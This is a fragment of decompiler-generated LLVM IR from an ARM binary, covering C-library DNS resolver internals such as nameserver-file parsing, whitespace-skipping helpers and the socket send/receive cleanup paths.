  %v2_16228 = inttoptr i32 %v1_16228 to i32*
  %v3_16228 = load i32, i32* %v2_16228, align 4
  %v1_1622c = add i32 %v3_16228, 1
  store i32 %v1_1622c, i32* %r3.global-to-local, align 4
  store i32 %v1_1622c, i32* %v2_16228, align 4
  br label %dec_label_pc_16234

dec_label_pc_16234:                               ; preds = %bb232, %dec_label_pc_161dc, %dec_label_pc_161cc, %dec_label_pc_16210
  %stack_var_-480.1 = phi i32 [ 0, %dec_label_pc_16210 ], [ 0, %dec_label_pc_161dc ], [ 0, %dec_label_pc_161cc ], [ 1, %bb232 ]
  %v1_1623c = load i32, i32* @r4, align 4
  %v2_1623c = add i32 %v1_1623c, %stack_var_-460.365
  %v1_16240 = add nuw nsw i32 %stack_var_-452.062, 1
  store i32 %v1_16240, i32* @r1, align 4
  store i32 %tmp163, i32* %r3.global-to-local, align 4
  store i32 %v1_16240, i32* %r2.global-to-local, align 4
  %v3_16254 = icmp uge i32 %v1_16240, %tmp163
  store i1 %v3_16254, i1* %cpsr_c.global-to-local, align 1
  %v5_16258 = icmp slt i32 %v1_16240, %tmp163
  br i1 %v5_16258, label %dec_label_pc_16020, label %dec_label_pc_1625c

dec_label_pc_1625c:                               ; preds = %dec_label_pc_16118, %dec_label_pc_15ff8, %dec_label_pc_16234, %dec_label_pc_16170, %dec_label_pc_161a0, %bb231
  %v1_16260 = call i32 @__GI___libc_close(i32 %v3_15e14)
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16268 = icmp eq i32 %arg3, 0
  br i1 %v2_16268, label %.thread22, label %bb234

bb234:                                            ; preds = %dec_label_pc_1625c
  %v1_16270 = load i32, i32* @sl, align 4
  %v3_1626c = inttoptr i32 %arg3 to i32*
  store i32 %v1_16270, i32* %v3_1626c, align 4
  br label %bb235

.thread22:                                        ; preds = %dec_label_pc_1625c
  br label %bb235

bb235:                                            ; preds = %bb234, %.thread22
  store i32 ptrtoint (i32* @global_var_16278.638 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_16268, i32 ptrtoint (i32* @global_var_f3b8.198 to i32))
  store i32 %v1_15b98, i32* @r0, align 4
  %v0_1627c = call i32 @free()
  br label %dec_label_pc_162f4

dec_label_pc_16284:                               ; preds = %thread-pre-split, %dec_label_pc_15e60, %dec_label_pc_15fd0, %dec_label_pc_15fc8, %dec_label_pc_15f78, %dec_label_pc_15f84, %dec_label_pc_15f90thread-pre-split, %thread-pre-split.thread, %dec_label_pc_15f40, %dec_label_pc_16118, %dec_label_pc_1610c, %dec_label_pc_15e24, %dec_label_pc_15e04, %dec_label_pc_16204
  %v1_16288 = add i32 %v0_15d28, 1
  store i32 %v1_16288, i32* @r5, align 4
  br label %dec_label_pc_16294

dec_label_pc_16294:                               ; preds = %.thread8, %dec_label_pc_16284
  %storemerge23 = phi i32 [ -1, %dec_label_pc_16284 ], [ %v7_15f24, %.thread8 ]
  %stack_var_-468.2 = phi i32 [ %v1_16288, %dec_label_pc_16284 ], [ %v0_15d28, %.thread8 ]
  store i32 %storemerge23, i32* @r7, align 4
  %v1_16298 = add i32 %stack_var_-476.1, -1
  store i32 %v1_16298, i32* @ip, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp236 = icmp slt i32 %v1_16298, 1
  br i1 %tmp236, label %dec_label_pc_162b4, label %dec_label_pc_15c34

dec_label_pc_162ac:                               ; preds = %dec_label_pc_15dd8, %bb222, %bb217, %.thread6, %dec_label_pc_15bb4
  br label %dec_label_pc_162b4

dec_label_pc_162b4:                               ; preds = %dec_label_pc_16294, %.thread134, %dec_label_pc_162ac
  %stack_var_-488.2 = phi i32 [ -1, %dec_label_pc_162ac ], [ -1, %.thread134 ], [ %v3_15e14, %dec_label_pc_16294 ]
  %stack_var_-472.1 = phi i32 [ %v1_15b98, %dec_label_pc_162ac ], [ 0, %.thread134 ], [ %v1_15b98, %dec_label_pc_16294 ]
  store i32 52824, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-488.2, i32* @r1, align 4
  %v0_162bc = call i32 @__aeabi_read_tp()
  %v3_162c0 = load i32, i32* @global_var_23120.283, align 4
  store i32 %v3_162c0, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_162c8 = load i32, i32* @r1, align 4
  %v2_162c8 = icmp eq i32 %v0_162c8, -1
  store i1 %v2_162c8, i1* %cpsr_c.global-to-local, align 1
  %v7_162c8 = icmp eq i32 %v0_162c8, -1
  %v3_162cc = add i32 %v3_162c0, %v0_162bc
  %v4_162cc = inttoptr i32 %v3_162cc to i32*
  store i32 -1, i32* %v4_162cc, align 4
  br i1 %v7_162c8, label %dec_label_pc_162dc, label %dec_label_pc_162d4

dec_label_pc_162d4:                               ; preds = %dec_label_pc_162b4, %dec_label_pc_15f70
  %stack_var_-488.3 = phi i32 [ %stack_var_-488.2, %dec_label_pc_162b4 ], [ %v3_15e14, %dec_label_pc_15f70 ]
  %stack_var_-472.2 = phi i32 [ %stack_var_-472.1, %dec_label_pc_162b4 ], [ %v1_15b98, %dec_label_pc_15f70 ]
  %v1_162d8 = call i32 @__GI___libc_close(i32 %stack_var_-488.3)
  br label %dec_label_pc_162dc

dec_label_pc_162dc:                               ; preds = %dec_label_pc_162b4, %dec_label_pc_162d4
  %stack_var_-472.3 = phi i32 [ %stack_var_-472.1, %dec_label_pc_162b4 ], [ %stack_var_-472.2, %dec_label_pc_162d4 ]
  store i32 %stack_var_-472.3, i32* @r0, align 4
  %v0_162e0 = call i32 @free()
  %v0_162e4 = load i32, i32* @sl, align 4
  store i32 %v0_162e4, i32* @r0, align 4
  %v0_162e8 = call i32 @free()
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_162f4

dec_label_pc_162f4:                               ; preds = %bb235, %dec_label_pc_162dc
  %stack_var_-484.0 = phi i32 [ -1, %dec_label_pc_162dc ], [ %v4_15e9c, %bb235 ]
  store i32 %v3_15b3c, i32* @r4, align 4
  store i32 %v6_15b3c, i32* @r5, align 4
  store i32 %v9_15b3c, i32* @r6, align 4
  store i32 %v12_15b3c, i32* @r7, align 4
  store i32 %v15_15b3c, i32* @r8, align 4
  store i32 %v18_15b3c, i32* @sb, align 4
  store i32 %v21_15b3c, i32* @sl, align 4
  store i32 %v24_15b3c, i32* @fp, align 4
  store i32 %v27_15b3c, i32* @lr, align 4
  ret i32 %stack_var_-484.0

; uselistorder directives
  uselistorder i32 %stack_var_-472.1, { 1, 0 }
  uselistorder i32 %v1_16298, { 1, 2, 0 }
  uselistorder i32 %v1_16240, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_161f4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_161b0, { 1, 0, 2 }
  uselistorder i32 %v0_16134, { 1, 0, 2, 3 }
  uselistorder i32 %v2_160dc, { 1, 0 }
  uselistorder i32 %v5_160b4, { 5, 0, 2, 3, 4, 1, 7, 6, 8 }
  uselistorder i32 %v2_16074, { 4, 5, 0, 6, 7, 1, 2, 3, 8, 9, 10, 11 }
  uselistorder i32 %v2_16070, { 1, 0 }
  uselistorder i32 %v2_16054, { 0, 3, 2, 4, 1, 5, 6 }
  uselistorder i32 %v2_16050, { 1, 0 }
  uselistorder i32 %v1_1604c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-452.062, { 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-460.365, { 0, 1, 4, 2, 3 }
  uselistorder i32 %v0_15fc8, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v2_15fa4, { 1, 0 }
  uselistorder i32 %v3_15f98, { 2, 0, 1, 3 }
  uselistorder i32 %v0_15f98, { 0, 2, 1 }
  uselistorder i32 %v2_15f8c, { 0, 2, 1 }
  uselistorder i1 %v7_15eac, { 1, 0 }
  uselistorder i32 %v1_15eac, { 1, 0 }
  uselistorder i32 %v0_15eac, { 1, 0 }
  uselistorder i32 %v4_15e9c, { 1, 2, 4, 3, 0, 5, 6, 7 }
  uselistorder i32 %v0_15e70, { 1, 0 }
  uselistorder i32 %v3_15e14, { 1, 0, 2, 6, 7, 5, 4, 8, 9, 10, 3 }
  uselistorder i32 %v6_15dcc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15d58, { 0, 1, 5, 4, 3, 2 }
  uselistorder i32 %v3_15d40, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 %v1_15d34, { 1, 0 }
  uselistorder i32 %v0_15d28, { 4, 3, 1, 2, 0 }
  uselistorder i32 %v0_15ce0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_15c4c, { 1, 0, 2 }
  uselistorder i1 %v7_15c38, { 1, 0 }
  uselistorder i32 %v1_15c3c, { 0, 2, 1 }
  uselistorder i32 %v2_16000, { 1, 0 }
  uselistorder i32 %v1_15f00, { 2, 0, 1 }
  uselistorder i32 %v2_15d88, { 1, 0, 2 }
  uselistorder i32 %v2_15d60, { 1, 0 }
  uselistorder i32 %v0_15bb4, { 1, 0, 2 }
  uselistorder i32 %v1_15b98, { 5, 0, 2, 4, 3, 6, 7, 1, 8, 9 }
  uselistorder i32 %v3_15b64, { 6, 1, 3, 2, 4, 5, 0, 7 }
  uselistorder i32 %v0_15b50, { 9, 8, 7, 6, 5, 4, 10, 0, 1, 3, 2 }
  uselistorder i16* %stack_var_-104, { 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 2, 0, 3, 1, 4 }
  uselistorder i32 %tmp164, { 1, 0, 2 }
  uselistorder i32 %tmp163, { 8, 7, 6, 0, 5, 2, 3, 1, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 16, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 53, 17, 18, 54, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 55, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 14, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 44, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 7, 2, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 23, 19, 20, 21, 22, 24, 25, 26, 27, 28, 29, 30, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 4, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 1, 19, 20, 54, 22, 23, 24, 25, 26, 55, 27, 28, 29, 30, 31, 32, 33, 34, 35, 0, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32 (i32)* @__GI___libc_close, { 4, 3, 5, 9, 8, 7, 6, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__decode_dotted, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 1, 2, 0 }
  uselistorder i32 1000, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 4, 3, 0, 2 }
  uselistorder i32 17, { 1, 5, 2, 6, 0, 4, 7, 3 }
  uselistorder i32 120, { 0, 2, 3, 4, 10, 8, 9, 5, 6, 1, 7 }
  uselistorder i32 27, { 2, 1, 0 }
  uselistorder i8 46, { 3, 2, 0, 4, 1, 5 }
  uselistorder i8 45, { 3, 1, 4, 2, 0, 5 }
  uselistorder i32 13320, { 2, 0, 1, 3 }
  uselistorder i32 512, { 4, 7, 8, 3, 9, 5, 10, 2, 11, 12, 13, 14, 6, 0, 1 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_162f4, { 1, 0 }
  uselistorder label %dec_label_pc_162dc, { 1, 0 }
  uselistorder label %dec_label_pc_162b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_162ac, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_16294, { 1, 0 }
  uselistorder label %dec_label_pc_16284, { 13, 9, 10, 2, 3, 6, 5, 4, 8, 0, 7, 1, 11, 12 }
  uselistorder label %bb235, { 1, 0 }
  uselistorder label %dec_label_pc_1625c, { 2, 4, 5, 3, 0, 1 }
  uselistorder label %dec_label_pc_16234, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1618c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1610c, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_16020, { 1, 0 }
  uselistorder label %dec_label_pc_15fc8, { 1, 0 }
  uselistorder label %dec_label_pc_15f98, { 1, 0 }
  uselistorder label %dec_label_pc_15f70, { 1, 0 }
  uselistorder label %dec_label_pc_15eac, { 1, 0, 2 }
  uselistorder label %bb222, { 1, 0 }
  uselistorder label %dec_label_pc_15d08, { 1, 0 }
  uselistorder label %dec_label_pc_15ccc, { 1, 0 }
  uselistorder label %bb220, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_16304:
  %v0_16304 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16304, label %bb, label %.thread13

bb:                                               ; preds = %dec_label_pc_16304
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_16304, %bb
  %v10_1633c = phi i32 [ %arg1, %dec_label_pc_16304 ], [ 0, %bb ]
  ret i32 %v10_1633c

; uselistorder directives
  uselistorder label %.thread13, { 1, 0 }
}

define i32 @skip_nospace() local_unnamed_addr {
entry:
  store i32 800, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @ip, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @skip_and_NUL_space(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_163a4 = load i32, i32* @r4, align 4
  store i32 %v3_163a4, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %ip.global-to-local, align 4
  store i32 800, i32* %r4.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_163b4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_163b49 = inttoptr i32 %v0_163b4.pre to i8*
  %v2_163b410 = load i8, i8* %v1_163b49, align 1
  %v2_163b812 = icmp eq i8 %v2_163b410, 0
  store i1 %v2_163b812, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_163b812, label %dec_label_pc_163e8, label %dec_label_pc_163c4

dec_label_pc_163c4:                               ; preds = %entry, %bb8.dec_label_pc_163c4_crit_edge
  %v1_163c4 = phi i32 [ %v1_163c4.pre, %bb8.dec_label_pc_163c4_crit_edge ], [ 800, %entry ]
  %v0_163c4 = phi i32 [ %v0_163c4.pre, %bb8.dec_label_pc_163c4_crit_edge ], [ ptrtoint (i32* @global_var_23104.179 to i32), %entry ]
  %v2_163b416 = phi i8 [ %v2_163b4, %bb8.dec_label_pc_163c4_crit_edge ], [ %v2_163b410, %entry ]
  %v2_163bc17.in.in = phi i8 [ %v2_163b4, %bb8.dec_label_pc_163c4_crit_edge ], [ %v2_163b410, %entry ]
  %v1_163b415 = phi i8* [ %v1_163b4, %bb8.dec_label_pc_163c4_crit_edge ], [ %v1_163b49, %entry ]
  %v2_163dc14 = phi i32 [ %v2_163e0, %bb8.dec_label_pc_163c4_crit_edge ], [ %v0_163b4.pre, %entry ]
  %v2_163bc17.in = zext i8 %v2_163bc17.in.in to i32
  %v2_163bc17 = mul nuw nsw i32 %v2_163bc17.in, 2
  %v2_163c4 = add i32 %v1_163c4, %v0_163c4
  %v3_163c4 = inttoptr i32 %v2_163c4 to i32*
  %v4_163c4 = load i32, i32* %v3_163c4, align 4
  %v2_163c8 = add i32 %v4_163c4, %v2_163bc17
  %v3_163c8 = inttoptr i32 %v2_163c8 to i16*
  %v4_163c8 = load i16, i16* %v3_163c8, align 2
  %v1_163cc = and i16 %v4_163c8, 32
  %v2_163cc = icmp eq i16 %v1_163cc, 0
  store i1 %v2_163cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_163cc, label %dec_label_pc_163e8, label %dec_label_pc_163d4

dec_label_pc_163d4:                               ; preds = %dec_label_pc_163c4
  %v7_163d4 = icmp eq i8 %v2_163b416, 35
  br i1 %v7_163d4, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_163d4
  %v8_163d8 = icmp eq i8 %v2_163b416, 10
  br label %bb7

bb7:                                              ; preds = %dec_label_pc_163d4, %bb
  %storemerge = phi i1 [ %v8_163d8, %bb ], [ %v7_163d4, %dec_label_pc_163d4 ]
  store i1 %storemerge, i1* %cpsr_z.global-to-local, align 1
  %v0_163dc = load i32, i32* %lr.global-to-local, align 4
  %v1_163dc = trunc i32 %v0_163dc to i8
  store i8 %v1_163dc, i8* %v1_163b415, align 1
  %v0_163e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_163ec.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_163e0, label %dec_label_pc_163e8, label %bb8

bb8:                                              ; preds = %bb7
  %v2_163e0 = add i32 %v1_163ec.pre, 1
  store i32 %v2_163e0, i32* %r0.global-to-local, align 4
  %v1_163b4 = inttoptr i32 %v2_163e0 to i8*
  %v2_163b4 = load i8, i8* %v1_163b4, align 1
  %v2_163b8 = icmp eq i8 %v2_163b4, 0
  store i1 %v2_163b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_163b8, label %dec_label_pc_163e8, label %bb8.dec_label_pc_163c4_crit_edge

bb8.dec_label_pc_163c4_crit_edge:                 ; preds = %bb8
  %v0_163c4.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_163c4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_163c4

dec_label_pc_163e8:                               ; preds = %bb8, %dec_label_pc_163c4, %bb7, %entry
  %v1_163ec = phi i32 [ %v0_163b4.pre, %entry ], [ %v1_163ec.pre, %bb7 ], [ %v2_163dc14, %dec_label_pc_163c4 ], [ %v2_163e0, %bb8 ]
  %v2_163e8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_163e8, i32* @r4, align 4
  ret i32 %v1_163ec

; uselistorder directives
  uselistorder i8 %v2_163b4, { 2, 1, 0 }
  uselistorder i8* %v1_163b4, { 1, 0 }
  uselistorder i32 %v2_163e0, { 0, 2, 3, 1 }
  uselistorder i1 %v2_163cc, { 1, 0 }
  uselistorder i8 %v2_163b416, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 1, 0, 2, 4 }
  uselistorder i16 0, { 0, 5, 1, 6, 2, 3, 4 }
  uselistorder i32 800, { 0, 4, 5, 6, 2, 3, 1, 7 }
  uselistorder label %dec_label_pc_163e8, { 0, 2, 1, 3 }
  uselistorder label %bb7, { 1, 0 }
  uselistorder label %dec_label_pc_163c4, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-68 = alloca i16, align 2
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-560 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_163f8 = load i32, i32* @r4, align 4
  store i32 %v3_163f8, i32* %stack_var_-36, align 4
  %v12_163f8 = load i32, i32* @r7, align 4
  %v15_163f8 = load i32, i32* @r8, align 4
  %v18_163f8 = load i32, i32* @sb, align 4
  %v21_163f8 = load i32, i32* @sl, align 4
  %v27_163f8 = load i32, i32* @lr, align 4
  store i32 14412, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r5, align 4
  %v4_16408 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 14412) to i32*), align 4
  store i32 %v4_16408, i32* @r4, align 4
  %v2_1640c = icmp eq i32 %v4_16408, 0
  br i1 %v2_1640c, label %dec_label_pc_16418, label %dec_label_pc_16448

dec_label_pc_16418:                               ; preds = %entry
  %v2_1641c = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1641c, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -33204), i32* %r0.global-to-local, align 4
  %v2_16424 = call i32 @__GI_stat(i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -33204), i32 %v2_1641c)
  store i32 %v2_16424, i32* %r0.global-to-local, align 4
  %v2_16428 = icmp eq i32 %v2_16424, 0
  %v1_1642c = load i32, i32* @r4, align 4
  %.v1_1642c = select i1 %v2_16428, i32 %tmp38, i32 %v1_1642c
  store i32 13348, i32* %r1.global-to-local, align 4
  store i32 %.v1_1642c, i32* %r2.global-to-local, align 4
  %v0_16438 = load i32, i32* @r5, align 4
  %v2_16438 = add i32 %v0_16438, 13348
  %v3_16438 = inttoptr i32 %v2_16438 to i32*
  %v4_16438 = load i32, i32* %v3_16438, align 4
  store i32 %v4_16438, i32* %r3.global-to-local, align 4
  %v9_1643c = icmp eq i32 %v4_16438, %.v1_1642c
  br i1 %v9_1643c, label %bb58, label %bb

bb:                                               ; preds = %dec_label_pc_16418
  store i32 %.v1_1642c, i32* %v3_16438, align 4
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_16418, %bb
  store i32 91208, i32* @lr, align 4
  %v1_16444 = xor i1 %v9_1643c, true
  call void @__pseudo_cond_branch(i1 %v1_16444, i32 ptrtoint (i32* @global_var_16854.648 to i32))
  %v0_1644c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16448

dec_label_pc_16448:                               ; preds = %entry, %bb58
  %v2_16460 = phi i32 [ ptrtoint (i32* @global_var_23104.179 to i32), %entry ], [ %v0_1644c.pre, %bb58 ]
  store i32 14424, i32* %r3.global-to-local, align 4
  %v2_1644c = add i32 %v2_16460, 14424
  %v3_1644c = inttoptr i32 %v2_1644c to i32*
  %v4_1644c = load i32, i32* %v3_1644c, align 4
  store i32 %v4_1644c, i32* %r3.global-to-local, align 4
  %v2_16450 = icmp eq i32 %v4_1644c, 0
  br i1 %v2_16450, label %dec_label_pc_16458, label %dec_label_pc_167ec

dec_label_pc_16458:                               ; preds = %dec_label_pc_16448
  %v4_16460 = add i32 %v2_16460, 818
  %v5_16460 = inttoptr i32 %v4_16460 to i8*
  store i8 5, i8* %v5_16460, align 1
  store i32 -33204, i32* %r0.global-to-local, align 4
  store i32 819, i32* %r3.global-to-local, align 4
  store i32 -33232, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_16474 = load i32, i32* @r5, align 4
  %v4_16474 = add i32 %v2_16474, 819
  %v5_16474 = inttoptr i32 %v4_16474 to i8*
  store i8 3, i8* %v5_16474, align 1
  %v0_16478 = load i32, i32* @r5, align 4
  %v1_16478 = load i32, i32* %r0.global-to-local, align 4
  %v2_16478 = add i32 %v1_16478, %v0_16478
  store i32 %v2_16478, i32* @r0, align 4
  %v1_1647c = load i32, i32* %r1.global-to-local, align 4
  %v2_1647c = add i32 %v1_1647c, %v0_16478
  store i32 %v2_1647c, i32* @r1, align 4
  %v2_16480 = call i32 @__GI_fopen(i32 %v2_16478, i32 %v2_1647c)
  store i32 %v2_16480, i32* %r0.global-to-local, align 4
  store i32 %v2_16480, i32* @fp, align 4
  %v2_16484 = icmp eq i32 %v2_16480, 0
  br i1 %v2_16484, label %dec_label_pc_16710, label %dec_label_pc_166b8

dec_label_pc_16490:                               ; preds = %dec_label_pc_166b8, %dec_label_pc_166ec.backedge
  store i32 %v2_166ec, i32* %r0.global-to-local, align 4
  %v2_16494 = call i32 @skip_and_NUL_space(i8* %v1_16494)
  store i32 %v2_16494, i32* %r0.global-to-local, align 4
  store i32 %v2_16494, i32* @r4, align 4
  %v0_1649c = call i32 @skip_nospace()
  store i32 %v0_1649c, i32* %r0.global-to-local, align 4
  %v1_164a0 = inttoptr i32 %v0_1649c to i8*
  %v2_164a0 = call i32 @skip_and_NUL_space(i8* %v1_164a0)
  store i32 %v2_166bc, i32* @r1, align 4
  store i32 %v2_164a0, i32* @r7, align 4
  %v0_164ac = load i32, i32* @r4, align 4
  store i32 %v0_164ac, i32* %r0.global-to-local, align 4
  %v2_164b0 = inttoptr i32 %v0_164ac to i8*
  %v3_164b0 = call i32 @__GI_strcoll(i8* %v2_164b0, i32 %v2_166bc)
  store i32 %v3_164b0, i32* %r0.global-to-local, align 4
  %sext = mul i32 %v3_164b0, 16777216
  %v1_164b4 = sdiv i32 %sext, 16777216
  store i32 %v1_164b4, i32* @r6, align 4
  %sext.off = or i32 %sext, 16777215
  %tmp = icmp ult i32 %sext.off, 33554431
  br i1 %tmp, label %dec_label_pc_164bc, label %dec_label_pc_16578

dec_label_pc_164bc:                               ; preds = %dec_label_pc_16490
  %v0_164bc = load i32, i32* @r7, align 4
  store i32 %v0_164bc, i32* %r0.global-to-local, align 4
  %v0_164c0 = call i32 @skip_nospace()
  %v1_164c0 = inttoptr i32 %v0_164c0 to i8*
  store i32 %v2_164c4, i32* @r4, align 4
  %v0_164c8 = load i32, i32* @r6, align 4
  %v1_164c8 = trunc i32 %v0_164c8 to i8
  store i8 %v1_164c8, i8* %v1_164c0, align 1
  %v0_164cc = load i32, i32* @r6, align 4
  store i32 %v0_164cc, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r2.global-to-local, align 4
  store i32 %v2_164c4, i32* %r0.global-to-local, align 4
  %v4_164d8 = call i32 @__GI_memset(i8* %v3_164d8, i32 %v0_164cc, i32 28)
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_164e0 = load i32, i32* @r7, align 4
  store i32 %v0_164e0, i32* %r1.global-to-local, align 4
  store i32 %v2_164e4, i32* %r2.global-to-local, align 4
  %v3_164e8 = inttoptr i32 %v0_164e0 to i8*
  %v4_164e8 = call i32 @inet_pton(i32 10, i8* %v3_164e8, i32 %v2_164e4)
  store i32 %v4_164e8, i32* %r0.global-to-local, align 4
  %tmp59 = icmp slt i32 %v4_164e8, 1
  br i1 %tmp59, label %dec_label_pc_164f8, label %dec_label_pc_16514

dec_label_pc_164f8:                               ; preds = %dec_label_pc_164bc
  %v0_164f8 = load i32, i32* @r7, align 4
  store i32 %v0_164f8, i32* %r1.global-to-local, align 4
  store i32 %v2_164fc, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_16504 = inttoptr i32 %v0_164f8 to i8*
  %v4_16504 = call i32 @inet_pton(i32 2, i8* %v3_16504, i32 %v2_164fc)
  store i32 %v4_16504, i32* %r0.global-to-local, align 4
  %tmp60 = icmp slt i32 %v4_16504, 1
  br i1 %tmp60, label %dec_label_pc_166ec.backedge, label %dec_label_pc_16514

dec_label_pc_16514:                               ; preds = %dec_label_pc_164f8, %dec_label_pc_164bc
  %v0_16518.off0 = phi i16 [ 10, %dec_label_pc_164bc ], [ 2, %dec_label_pc_164f8 ]
  store i32 %v2_16514, i32* %r2.global-to-local, align 4
  store i16 %v0_16518.off0, i16* %stack_var_-68, align 2
  store i32 13568, i32* %r3.global-to-local, align 4
  store i32 14424, i32* @r7, align 4
  %v0_16528 = load i32, i32* @r5, align 4
  %v2_16528 = add i32 %v0_16528, 14424
  %v3_16528 = inttoptr i32 %v2_16528 to i32*
  %v4_16528 = load i32, i32* %v3_16528, align 4
  store i32 14420, i32* @sl, align 4
  %v1_16530 = add i32 %v4_16528, 1
  store i32 %v1_16530, i32* %r3.global-to-local, align 4
  store i32 28, i32* @r8, align 4
  %v2_16538 = mul i32 %v1_16530, 28
  store i32 %v2_16538, i32* @r1, align 4
  %v2_1653c = add i32 %v0_16528, 14420
  %v3_1653c = inttoptr i32 %v2_1653c to i32*
  %v4_1653c = load i32, i32* %v3_1653c, align 4
  store i32 %v4_1653c, i32* %r0.global-to-local, align 4
  %v1_16540 = inttoptr i32 %v4_1653c to i32*
  %v2_16540 = call i32 @realloc(i32* %v1_16540)
  store i32 %v2_16540, i32* %r0.global-to-local, align 4
  store i32 %v2_16540, i32* @r6, align 4
  %v2_16544 = icmp eq i32 %v2_16540, 0
  br i1 %v2_16544, label %dec_label_pc_166ec.backedge, label %dec_label_pc_1654c

dec_label_pc_1654c:                               ; preds = %dec_label_pc_16514
  %v0_1654c = load i32, i32* @r5, align 4
  %v1_1654c = load i32, i32* @r7, align 4
  %v2_1654c = add i32 %v1_1654c, %v0_1654c
  %v3_1654c = inttoptr i32 %v2_1654c to i32*
  %v4_1654c = load i32, i32* %v3_1654c, align 4
